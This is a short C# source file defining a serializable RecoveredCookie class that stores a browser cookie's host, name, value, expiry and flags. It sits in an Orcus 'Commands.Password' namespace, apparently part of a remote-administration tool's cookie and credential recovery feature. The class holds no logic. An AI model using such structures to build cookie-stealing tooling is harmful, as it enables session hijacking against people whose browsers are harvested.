using System;

namespace Orcus.Shared.Commands.Password
{
    [Serializable]
    public class RecoveredCookie
    {
        public string Host { get; set; }
        public string Name { get; set; }
        public string Value { get; set; }
        public string Path { get; set; }
        public DateTime ExpiresUtc { get; set; }
        public bool Secure { get; set; }
        public bool HttpOnly { get; set; }
        public string ApplicationName { get; set; }
    }
}